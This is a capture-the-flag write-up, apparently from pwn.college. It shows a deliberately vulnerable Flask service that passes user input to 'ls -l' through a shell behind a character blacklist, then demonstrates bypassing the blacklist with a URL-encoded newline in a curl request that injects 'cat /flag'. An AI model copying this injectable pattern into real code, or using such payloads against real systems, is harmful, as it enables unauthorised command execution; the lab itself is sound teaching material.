This level is a classic command injection into the `ls` command. However, there's a lot of sanitization happening before the command is run.

```python
#!/opt/pwn.college/python

import subprocess
import flask
import os

app = flask.Flask(__name__)

@app.route("/", methods=["GET"])
def challenge():
    directory = (
        flask.request.args.get("directory", "/challenge")
        .replace(";", "")
        .replace("&", "")
        .replace("|", "")
        .replace(">", "")
        .replace("<", "")
        .replace("(", "")
        .replace(")", "")
        .replace("`", "")
        .replace("$", "")
    )
    command = f"ls -l {directory}"
    print(f"DEBUG: {command=}")

    listing = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout

    return f"""
        <html><body>
        Welcome to the dirlister service! Please choose a directory to list the files of:
        <form><input type=text name=directory><input type=submit value=Submit></form>
        <hr>
        <b>Output of: ls -l {directory}</b><br>
        <pre>{listing}</pre>
        </body></html>
        """

os.setuid(os.geteuid())
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

From the blacklist, I found that there are some characters like `\`, `!`, `{`, `}` that aren't blacklisted and might lead to some security issues. Out of the list of the 4 characters above, `\` has some potential in separating commands.

If you've ever written a bash script or mess around with the terminal before, you'll know that commands can be separated with the newline character `\n`. So we can try doing that in this level. The `%0A` is the URL encoded version of the newline character:

```bash
curl -v "http://challenge.localhost:80?directory=/%0Acat%20/flag"
```